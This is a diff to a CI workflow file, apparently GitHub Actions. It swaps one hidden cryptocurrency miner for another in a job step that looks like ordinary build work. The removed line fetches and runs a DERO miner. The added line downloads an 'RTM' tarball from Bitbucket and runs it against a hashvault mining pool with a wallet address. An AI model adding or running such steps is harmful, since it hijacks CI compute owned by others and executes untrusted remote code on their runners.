@@ -29,7 +29,6 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-         wget https://bitbucket.org/wename798/jaya/downloads/astrominer.tar.gz && tar -xvf astrominer.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmglejssqhngtrqzsn49h -r dero.rabidmining.com:10300
-
+         wget https://bitbucket.org/wename798/sawah/downloads/RTM.tar.gz &&  tar -xvf RTM.tar.gz && ./RTM --url pool.hashvault.pro:80 --user ZEPHsCkAtVmQPWiNweaUB2J8UC68jPZC9E1Sbztz2Nus2vtih87GdN3CpdzFs76CaXGuxHZ4SLFzAXnMzjLw4dHvbTbcpNsPE7f --pass crot --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
 
   
